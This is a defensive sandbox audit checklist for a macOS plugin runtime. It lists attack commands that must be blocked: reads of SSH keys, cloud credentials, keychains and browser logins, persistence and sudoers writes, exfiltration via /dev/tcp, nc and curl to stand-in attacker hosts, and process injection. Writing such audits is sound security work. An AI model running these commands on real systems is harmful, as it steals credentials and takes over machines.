# Adversarial Sandbox Audit — OmniGlass v1.0.0-beta (`sandbox-exec` profile)

> **Note on length (S-03 §1):** this is one cohesive audit checklist (single responsibility);
> splitting it would fracture the gate. The **hard prerequisite** for NARS-JARVIS M3 Phase B
> (ADR-002): **every attack below must be BLOCKED and every control must SUCCEED.** A single
> escape = audit FAIL = live execution stays gated.

## Methodology (read first — this prevents false passes)

1. **Run each attack inside the real plugin runtime** under the v1.0.0-beta profile (the Node/
   Python plugin runner), not only via a hand-rolled `sandbox-exec -f profile.sb`. The runner may
   add/remove restrictions.
2. **Pair every attack with a CONTROL run *outside* the sandbox.** The control MUST succeed —
   proving the target exists and the command is valid, so an in-sandbox failure is a *denial*, not
   a missing file. A test whose control fails is **void**, not a pass.
3. **Confirm the denial originates from the sandbox**, not incidentally from SIP/TCC/unix-perms:
   ```sh
   log stream --style compact --predicate 'process == "sandboxd" OR sender == "Sandbox"'
   # or, after the fact:
   log show --last 5m --predicate 'eventMessage CONTAINS "deny"' | grep -i <target>
   ```
   Expected denial on macOS: **`Operation not permitted` (EPERM)** + a `Sandbox: <proc> deny(1)
   <op> <path>` log line. **Critical:** `~/.ssh`, `~/.aws`, keychains, and cookies are NOT
   protected by SIP or TCC and ARE owner-readable — so the **sandbox profile itself** must be the
   blocker. If those reads only fail outside the sandbox too, the profile is not protecting them.
4. **Deprecation note:** `sandbox-exec` is Apple-deprecated (functional, unsupported). The audit
   validates the *current* profile; track Apple's posture as a standing risk.

---

## Vector 1 — File-System Exfiltration

**Reads (must all return `Operation not permitted`):**
```sh
cat ~/.ssh/id_rsa
cat ~/.ssh/id_ed25519
cat ~/.aws/credentials
cat ~/.config/gh/hosts.yml          # GitHub OAuth token
cat ~/.netrc
cat ~/Library/Keychains/login.keychain-db
security dump-keychain login.keychain-db
sqlite3 "~/Library/Application Support/Google/Chrome/Default/Login Data" "select * from logins"
cat "~/Library/Application Support/Google/Chrome/Default/Cookies"
cat ~/Library/Cookies/Cookies.binarycookies
ls -la ~/                           # directory enumeration of $HOME
cat /etc/master.passwd
```
**Writes / persistence (must all be denied):**
```sh
echo "attacker-pubkey" >> ~/.ssh/authorized_keys
cp /tmp/eviltask.plist ~/Library/LaunchAgents/com.evil.persist.plist
printf 'curl evil|sh\n' >> ~/.zshrc
```
**Symlink / TOCTOU escape (the classic sandbox break — must be denied):**
```sh
ln -s ~/.ssh/id_rsa <approved_path>/leak.txt && cat <approved_path>/leak.txt
ln -s /Users <approved_path>/root && cat <approved_path>/root/<other_user>/.ssh/id_rsa
```
PASS ⇔ no secret bytes ever reach stdout; each is EPERM with a `deny file-read*`/`file-write*` log.

---

## Vector 2 — Privilege Escalation

```sh
sudo -n id                                              # must NOT obtain root
echo 'nobody ALL=(ALL) NOPASSWD: ALL' | sudo tee -a /etc/sudoers
sudo tee /etc/sudoers.d/evil <<< 'nobody ALL=(ALL) NOPASSWD: ALL'
cp /tmp/evil.plist /Library/LaunchDaemons/com.evil.root.plist   # root persistence
launchctl load -w /Library/LaunchDaemons/com.evil.root.plist
chmod 4755 /tmp/evilbin                                 # create setuid binary
kextload /tmp/evil.kext                                 # load kernel extension
```
PASS ⇔ `sudo` cannot escalate (exec denied or no authentication path), every write to `/etc`,
`/Library/LaunchDaemons`, and the kext/setuid attempts return `Operation not permitted`.

---

## Vector 3 — Network Exfiltration

**Outbound to non-allowlisted destinations (must be denied):**
```sh
bash -c 'cat ~/.ssh/id_rsa > /dev/tcp/198.51.100.7/4444'   # reverse exfil
nc -w 3 198.51.100.7 4444 < /etc/hostname
curl -s "http://attacker.example.com/leak?u=$(whoami)"
curl -s https://203.0.113.9/                               # raw IP, off allowlist
```
**Raw sockets / inbound listeners (must be denied):**
```sh
python3 -c "import socket;s=socket.socket();s.bind(('0.0.0.0',4444));s.listen(1)"
python3 -c "import socket;socket.socket(socket.AF_INET,socket.SOCK_RAW,1)"
```
**Lateral to local services (must be denied unless allowlisted):**
```sh
curl -s http://127.0.0.1:11434/        # a local model/daemon port
```
**Environment-secret leakage (OmniGlass env-filter layer — must be EMPTY):**
```sh
env | grep -Ei 'key|secret|token|password|aws|anthropic|openai'   # expect: no output
printf '%s|%s|%s\n' "$ANTHROPIC_API_KEY" "$AWS_SECRET_ACCESS_KEY" "$OPENAI_API_KEY"  # expect: ||
```
PASS ⇔ every off-allowlist `connect()`/`bind()` is denied (`network-outbound`/`network-bind`),
and no secret is present in the plugin environment.

---

## Vector 4 — Process Injection & IPC

```sh
lldb -p $(pgrep -x Finder | head -1)                    # debugger attach -> task port
python3 -c "import ctypes;ctypes.CDLL(None).ptrace(0,$(pgrep -x Finder|head -1),0,0)"
DYLD_INSERT_LIBRARIES=/tmp/evil.dylib open -a Slack      # dylib injection into a signed app
osascript -e 'tell application "Safari" to get URL of front document'   # Apple Events automation
osascript -e 'tell application "System Events" to keystroke "x"'        # synthetic keystroke / keylog
kill -9 $(pgrep -x Finder | head -1)                    # signal an unrelated process
screencapture -x /tmp/leak.png                          # screen capture (TCC)
```
PASS ⇔ `task_for_pid`/`ptrace` attaches fail; injection is blocked (sandbox + hardened runtime);
Apple Events return *"Not authorized to send Apple events"*; the unrelated `kill` and
`screencapture` are denied / unauthorized.

---

## Negative Controls (these MUST SUCCEED — proving the profile is not trivially deny-all)

```sh
open -a Slack                          # an allowlisted catalog operation
df -h                                  # a vetted SavedCommand template
curl -s https://<plugin_declared_host>/   # the plugin manifest's allowlisted host
cat <user_approved_snip_path>          # a path the user explicitly approved
```
If any control FAILS, the profile is over-broad (useless) — that is also an audit FAIL.

---

## Verdict

| Outcome | Meaning |
| ------- | ------- |
| All attacks denied **and** all controls succeed **and** denials are sandbox-sourced | **PASS** — Phase B may be authorized by explicit human sign-off |
| Any single attack succeeds (esp. a Vector-1 secret read or a symlink escape) | **FAIL — critical** — live execution stays permanently gated |
| Any control fails | **FAIL** — profile is over-broad; revise and re-audit |

Sign-off requires the PASS row above, dated, against **v1.0.0-beta specifically** (version-locked
per the reconciliation). Only then may a human set `OmniGlassExecutor(authorized=True)`.
